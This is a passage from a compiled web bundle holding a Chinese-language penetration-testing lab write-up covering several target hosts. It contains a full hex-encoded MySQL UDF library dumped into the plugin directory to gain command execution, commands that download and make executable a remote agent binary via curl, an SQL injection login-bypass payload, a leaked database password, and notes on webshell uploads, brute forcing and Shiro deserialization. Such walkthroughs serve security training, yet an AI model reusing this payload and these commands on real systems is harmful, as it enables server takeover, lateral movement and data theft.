6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000 INTO DUMPFILE '/usr/lib64/mysql/plugin/udf64.so';\nQuery OK, 1 row affected (0.004 sec)\n\nMySQL [data]> CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf64.so';\nQuery OK, 0 rows affected (0.003 sec)\n\nMySQL [data]> select * from mysql.func;\n+----------+-----+----------+----------+\n| name     | ret | dl       | type     |\n+----------+-----+----------+----------+\n| sys_eval |   0 | udf64.so | function |\n+----------+-----+----------+----------+\n1 row in set (0.003 sec)\n\nMySQL [data]> select sys_eval('whoami');\n+--------------------+\n| sys_eval('whoami') |\n+--------------------+\n| mysql              |\n+--------------------+\n1 row in set (0.008 sec)\n\nMySQL [data]> select sys_eval('id');\n+-------------------------------------------------+\n| sys_eval('id')                                  |\n+-------------------------------------------------+\n| uid=999(mysql) gid=999(mysql) groups=999(mysql) |\n+-------------------------------------------------+\n1 row in set (0.007 sec)\n\nMySQL [data]>\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u4e4b\u540e\u67e5\u770b\u5bf9\u5e94\u4e3b\u673a\u7684 ",(0,t.jsx)(n.code,{children:"/etc/hosts"})," \u6587\u4ef6\u6211\u77e5\u9053\u4e86\u8fd9\u4e2a\u6570\u636e\u5e93\u7684 IP \u540c\u65f6\u53d1\u73b0\u4e86\u65b0\u7684\u7f51\u6bb5, \u7136\u540e\u5f00\u59cb\u6302\u4e8c\u7ea7\u4ee3\u7406\u5427, \u4e4b\u540e\u6211\u5229\u7528 ",(0,t.jsx)(n.code,{children:"172.25.20.10"})," \u4e3b\u673a\u5411 ",(0,t.jsx)(n.code,{children:"172.25.20.12"})," \u4e3b\u673a\u4e0a\u4f20\u4e86 linux_x64_agent \u4e4b\u540e, \u5e76\u8d4b\u4e88\u5176\u6267\u884c\u7684\u6743\u9650"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"MySQL [data]> select sys_eval('curl http://172.25.20.10:8000/linux_x64_agent -o /tmp/linux_x64_agent');\n+-----------------------------------------------------------------------------------+\n| sys_eval('curl http://172.25.20.10:8000/linux_x64_agent -o /tmp/linux_x64_agent') |\n+-----------------------------------------------------------------------------------+\n| NULL                                                                              |\n+-----------------------------------------------------------------------------------+\n1 row in set (0.014 sec)\n\nMySQL [data]> select sys_eval('ls /tmp/linux_x64_agent');\n+-------------------------------------+\n| sys_eval('ls /tmp/linux_x64_agent') |\n+-------------------------------------+\n| /tmp/linux_x64_agent                |\n+-------------------------------------+\n1 row in set (0.010 sec)\n\nMySQL [data]> select sys_eval('chmod +x /tmp/linux_x64_agent');\n+-------------------------------------------+\n| sys_eval('chmod +x /tmp/linux_x64_agent') |\n+-------------------------------------------+\n| NULL                                      |\n+-------------------------------------------+\n1 row in set (0.009 sec)\n"})}),"\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240518203038.png",alt:"20240518203038"}),"\n",(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240518203047.png",alt:"20240518203047"})]}),"\n",(0,t.jsx)(n.h4,{id:"172263011",children:"172.26.30.11"}),"\n",(0,t.jsxs)(n.p,{children:["\u4f7f\u7528 nmap \u5bf9\u76ee\u6807\u7f51\u6bb5\u8fdb\u884c\u626b\u63cf, \u53d1\u73b0\u4e86\u65b0\u7684\u4e3b\u673a ",(0,t.jsx)(n.code,{children:"172.26.30.11"})]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"bash-4.2$ ./nmap -sn 172.26.30.4/24\n\nStarting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-12-09 11:37 GMT\nCannot find nmap-payloads. UDP payloads are disabled.\nNmap scan report for 172.26.30.1\nHost is up (0.00019s latency).\nNmap scan report for 917a4a8430cf (172.26.30.4)\nHost is up (0.000084s latency).\nNmap scan report for 2-log4j2-1.2_ntwo2 (172.26.30.11)\nHost is up (0.000086s latency).\nNmap done: 256 IP addresses (3 hosts up) scanned in 14.91 seconds\n\nbash-4.2$ ./nmap -sT -p- 172.26.30.11\n\nStarting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-12-09 11:39 GMT\nUnable to find nmap-services!  Resorting to /etc/services\nCannot find nmap-payloads. UDP payloads are disabled.\nNmap scan report for 2-log4j2-1.2_ntwo2 (172.26.30.11)\nHost is up (0.000092s latency).\nNot shown: 65534 closed ports\nPORT     STATE SERVICE\n8983/tcp open  unknown\n\nNmap done: 1 IP address (1 host up) scanned in 1.29 seconds\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u4e4b\u540e\u8bbe\u7f6e\u4ee3\u7406, \u8bbf\u95ee\u8fd9\u4e2a\u670d\u52a1, \u6211\u4eec\u53ef\u4ee5\u5728\u6b64\u770b\u5230\u7248\u672c\u4fe1\u606f, \u7ecf\u8fc7\u67e5\u627e\u6211\u53d1\u73b0\u5176\u5b58\u5728 Log4j \u6f0f\u6d1e\n",(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240518203159.png",alt:"20240518203159"}),"\n\u73b0\u5728\u6211\u4eec\u9700\u8981\u8fdb\u884c\u4e00\u4e9b\u8f6c\u53d1, \u8ba9 \u5229\u7528 Mysql \u4e3b\u673a\u505a\u4ee3\u7406, \u5c06\u7b2c\u4e09\u53f0\u4e3b\u673a\u7684\u6d41\u91cf\u901a\u8fc7\u7b2c\u4e8c\u53f0\u4e3b\u673a\u653e\u51fa\u6765, \u53ef\u60dc\u4e0d\u77e5\u9053\u4ec0\u4e48\u539f\u56e0, \u5229\u7528\u4e0d\u4e86, \u96be\u53d7"]}),"\n",(0,t.jsx)(n.h2,{id:"web3",children:"Web3"}),"\n",(0,t.jsx)(n.h3,{id:"22883",children:"22883"}),"\n",(0,t.jsxs)(n.p,{children:["\u8fdb\u884c\u76ee\u5f55\u626b\u63cf, \u8fd9\u91cc\u7b2c\u4e00\u6b21\u6253\u7684\u65f6\u5019, \u5e76\u6ca1\u6709\u4ec0\u4e48\u8fdb\u5c55, \u56e0\u4e3a\u6211\u7684\u5b57\u5178\u91cc\u9762\u6839\u672c\u6ca1\u6709\u5bf9\u5e94\u7684\u5185\u5bb9, \u5728\u626b\u63cf\u540e\u53ef\u4ee5\u53d1\u73b0\u4e00\u4e2a\u76ee\u5f55  ",(0,t.jsx)(n.code,{children:"actuator"})," \u8fd9\u662f SpringBoot \u7684\u672a\u6388\u6743\u6f0f\u6d1e\n",(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240518203420.png",alt:"20240518203420"}),"\n\u4e4b\u540e\u8fd8\u53ef\u4ee5\u53d1\u73b0\u4e00\u4e2a ",(0,t.jsx)(n.code,{children:"/actuator/headdump"})," \u6211\u4eec\u5c06\u5176\u4e0b\u8f7d\u5e94\u8be5\u53ef\u4ee5\u4ece\u4e2d\u83b7\u53d6\u5230\u4e00\u4e2a Mysql \u7684\u8d26\u53f7"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"[password = MeetSec@2nd!2022, jdbcUrl = jdbc:mysql://mysql_heapdump:13306/db, username = meetsec]\n"})}),"\n",(0,t.jsx)(n.admonition,{title:"\u8d44\u6e90",type:"note",children:(0,t.jsxs)(n.p,{children:["\u5bf9\u5e94\u7684 SpringBoot \u6cc4\u9732\u6587\u4ef6\u53ef\u4ee5\u5728 ",(0,t.jsx)(n.a,{href:"https://pan.baidu.com/s/1PNvMPQsc-F70Lyk7ZNsRrA?pwd=f228",children:"\u5171\u4eab\u8d44\u6599/Resources/heapdump.hprof"})," \u4e0b\u8f7d"]})}),"\n",(0,t.jsx)(n.h3,{id:"13306",children:"13306"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240518235310.png",alt:"20240518235310"})}),"\n",(0,t.jsx)(n.admonition,{type:"tip",children:(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"Flag \u5728\u6570\u636e\u5e93\u4e2d"}),"\n"]})}),"\n",(0,t.jsx)(n.h2,{id:"web5",children:"Web5"}),"\n",(0,t.jsx)(n.h3,{id:"8082",children:"8082"}),"\n",(0,t.jsxs)(n.p,{children:["\u8bbf\u95ee\u53d1\u73b0\u5176\u662f\u4e00\u4e2a CMS\u7a0b\u5e8f, \u7ecf\u8fc7\u6211\u7684\u641c\u7d22\u6211\u53d1\u73b0\u5176\u5b58\u5728\u4e00\u7cfb\u5217\u7684\u6f0f\u6d1e, \u6211\u4ece\u4e2d\u8fdb\u884c\u7b5b\u9009\u6700\u7ec8\u9009\u62e9\u4e86\u5728\u7ba1\u7406\u5458\u767b\u9646\u8fdb\u884c SQL \u6ce8\u5165\u64cd\u4f5c, \u56e0\u4e3a\u5728\u767b\u9646\u65f6\u6211\u53d1\u73b0\u5f53\u6211\u8f93\u5165\u7528\u6237\u540d\u4e3a ",(0,t.jsx)(n.code,{children:"admin' or 1=1 -- -"})," \u5176\u62a5\u9519\u4e3a\u767b\u9646\u7528\u6237\u7684\u5bc6\u7801\u9519\u8bef\u800c\u4e0d\u662f\u7528\u6237\u4e0d\u5b58\u5728, \u6240\u4ee5\u662f\u5148\u5224\u65ad\u7528\u6237\u5b58\u5728\u4e0e\u5426\u624d\u8fdb\u884c\u8fdb\u4e00\u6b65\u9a8c\u8bc1\u5bc6\u7801, \u56e0\u6b64\u914d\u7f6e\u8054\u5408\u6ce8\u5165\u76f4\u63a5\u8fdb\u884c\u653b\u51fb, \u4e4b\u540e\u5c31\u53ef\u4ee5\u8bbf\u95ee\u7ba1\u7406\u5458\u754c\u9762\n",(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240519000154.png",alt:"20240519000154"}),"\n\u4e4b\u540e\u8fdb\u5165\u7ba1\u7406\u5458\u754c\u9762, \u6211\u4eec\u5c31\u53ef\u4ee5\u5f00\u59cb\u8003\u8651\u4e0a\u4f20 WebShell \u8fdb\u884c\u8fdb\u4e00\u6b65\u653b\u51fb\u4e86, \u518d\u6b21\u641c\u7d22\u53d1\u73b0\u4e00\u4e2a\u5bf9\u5e94\u7684\u65b9\u5f0f, \u901a\u8fc7\u5728 ",(0,t.jsx)(n.code,{children:"/admin/upload.php"})," \u4e0a\u4f20\u5185\u5bb9\u540e\u7aef\u4ec5\u4ec5\u901a\u8fc7 Content-Type \u505a\u6821\u9a8c\u56e0\u6b64\u5b8c\u5168\u53ef\u4ee5\u7ed5\u8fc7"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-http",children:"user=-1'+uniselecton+selselectect+1,'admin','e10adc3949ba59abbe56e057f20f883e',0,0+%23&password=123456&code=dfb2&submit=true&submit.x=17&submit.y=28\n"})}),"\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240519000243.png",alt:"20240519000243"}),"\n\u4e4b\u540e\u8bbf\u95ee\u5bf9\u5e94\u7684\u9875\u9762\u5c31\u53ef\u4ee5\u4e86\n",(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240519000304.png",alt:"20240519000304"})]}),"\n",(0,t.jsx)(n.h3,{id:"shell-2",children:"Shell"}),"\n",(0,t.jsx)(n.h4,{id:"1721702-www-data",children:"172.17.0.2 (www-data)"}),"\n",(0,t.jsx)(n.p,{children:"\u57fa\u4e8e\u524d\u9762\u83b7\u53d6\u5230\u7684 www-data \u7528\u6237\u7684 Shell, \u5c1d\u8bd5\u83b7\u53d6\u5230\u4e00\u4e2a\u53cd\u5411 Shell"}),"\n",(0,t.jsx)(n.h2,{id:"web6",children:"Web6"}),"\n",(0,t.jsx)(n.h3,{id:"8081",children:"8081"}),"\n",(0,t.jsxs)(n.p,{children:["\u8bbf\u95ee\u670d\u52a1\u53d1\u73b0\u662f\u4e00\u4e2a Tomcat \u9875\u9762, \u76f4\u63a5\u8fdb\u884c\u66b4\u529b\u7834\u89e3\u83b7\u53d6\u5230 manager \u7684\u8d26\u53f7, \u4e0a\u4f20\u540e\u95e8\u8fdb\u884c\u64cd\u4f5c\n",(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240519000500.png",alt:"20240519000500"}),"\n",(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240519000508.png",alt:"20240519000508"})]}),"\n",(0,t.jsx)(n.h2,{id:"web7",children:"Web7"}),"\n",(0,t.jsx)(n.h3,{id:"6379",children:"6379"}),"\n",(0,t.jsxs)(n.p,{children:["redis \u670d\u52a1, \u53d1\u73b0\u5b58\u5728\u5bc6\u7801\u8fdb\u884c\u66b4\u529b\u7834\u89e3, \u53ef\u4ee5\u7834\u89e3\u5f97\u5230\u6709\u4e2a\u5bc6\u7801\n",(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240519000628.png",alt:"20240519000628"}),"\n\u767b\u9646\u4e4b\u540e\u6211\u6309\u7167\u4f20\u7edf\u7684\u65b9\u5f0f\u5199\u5165\u8ba1\u5212\u4efb\u52a1\u53d1\u73b0\u6ca1\u6709\u7528, \u5c31\u5f88\u96be\u53d7, \u4f46\u662f\u53c8\u6ca1\u6709web \u7aef, \u5f88\u660e\u663e\u5e38\u89c1\u7684\u51e0\u79cd\u65b9\u5f0f\u5728\u8fd9\u91cc\u5df2\u7ecf\u90fd\u4e0d\u9002\u7528\u4e86, \u4e4b\u540e\u6211\u5c1d\u8bd5\u8fdb\u884c\u57fa\u4e8e\u4e4b\u524d\u53d1\u73b0\u7684\u4e3b\u673a\u8fdb\u884c docker \u9003\u9038\u4f46\u662f\u4e5f\u6ca1\u6709\u4ec0\u4e48\u6548\u679c, \u7136\u540e\u6211\u4fee\u6539\u4e86\u81ea\u5df1\u5df2\u7ecf\u83b7\u53d6\u5230\u7684 Shell \u4e2d\u7684\u955c\u50cf\u4e00\u4e9b sh \u811a\u672c\u53ef\u60dc\u6ca1\u7528"]}),"\n",(0,t.jsx)(n.admonition,{type:"note",children:(0,t.jsx)(n.p,{children:"\u6ca1\u6709\u6d4b\u8bd5\u6210\u529f, \u4e0d\u77e5\u9053\u600e\u4e48\u56de\u4e8b"})}),"\n",(0,t.jsx)(n.h2,{id:"web9",children:"Web9"}),"\n",(0,t.jsx)(n.h3,{id:"8848",children:"8848"}),"\n",(0,t.jsxs)(n.p,{children:["\u8bbf\u95ee\u53d1\u73b0\u662f\u4e00\u4e2a 404 \u9875\u9762, \u8fdb\u884c\u76ee\u5f55\u7684\u626b\u63cf, \u53d1\u73b0 nacos \u6846\u67b6, \u641c\u7d22\u53d1\u73b0\u4e00\u4e2a\u9ed8\u8ba4\u7684\u5bc6\u7801, \u53d1\u73b0\u53ef\u4ee5\u767b\u9646\n",(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240519000734.png",alt:"20240519000734"}),"\n\u767b\u9646\u4e4b\u540e\u7ecf\u8fc7\u641c\u7d22\u53ef\u4ee5\u53d1\u73b0\u4e00\u4e2a Key\n",(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240519000852.png",alt:"20240519000852"})]}),"\n",(0,t.jsx)(n.h3,{id:"58080",children:"58080"}),"\n",(0,t.jsxs)(n.p,{children:["\u5728\u8fd9\u91cc\u6211\u770b\u5230\u8fd9\u4e2a\u9875\u9762, \u6211\u60f3\u8d77\u6765\u4e4b\u524d\u5b66\u4e60 JAVA \u7684\u65f6\u5019\u6709\u4e2a Spring \u7ec4\u4ef6\u5c31\u662f\u8fd9\u4e48\u4e2a\u9ed8\u8ba4\u9875\u9762, \u4f46\u662f\u60f3\u4e0d\u8d77\u6765\u6211\u5c31\u76f4\u63a5\u622a\u56fe\u8c37\u6b4c\u641c\u7d22, \u7ed3\u679c\u53d1\u73b0\u4e00\u4e9b\u5185\u5bb9\u786e\u5b9a\u4e86\u6211\u7684\u60f3\u6cd5, \u5c31\u662f\u6253\u53cd\u5e8f\u5217\u5316\u7684\n",(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240519000913.png",alt:"20240519000913"}),"\n\u4e4b\u540e\u67e5\u770b Burp \u7684\u8bf7\u6c42\u6211\u53d1\u73b0\u5176\u4e2d\u4e00\u4e9b\u7279\u6b8a\u7684 Cookie , \u4e4b\u540e\u518d\u6b64\u641c\u7d22\u5c06\u653b\u51fb\u8303\u56f4\u5728\u6b64\u7f29\u51cf\u5230 shiro\n",(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240519000928.png",alt:"20240519000928"}),"\n\u4e4b\u540e\u5728 Github \u5bfb\u627e\u5230\u4e00\u4e2a\u5de5\u5177, \u5e76\u4f7f\u7528\u83b7\u53d6\u7684 Key \u8fdb\u884c\u5229\u7528\u5373\u53ef, \u5e76\u4e14\u662f Root \u6743\u9650\n",(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240519001015.png",alt:"20240519001015"})]})]})}function r(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(l,{...e})}):l(e)}},28453:(e,n,f)=>{f.d(n,{R:()=>s,x:()=>o});var t=f(96540);const a={},c=t.createContext(a);function s(e){const n=t.useContext(c);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:s(e.components),t.createElement(c.Provider,{value:n},e.children)}}}]);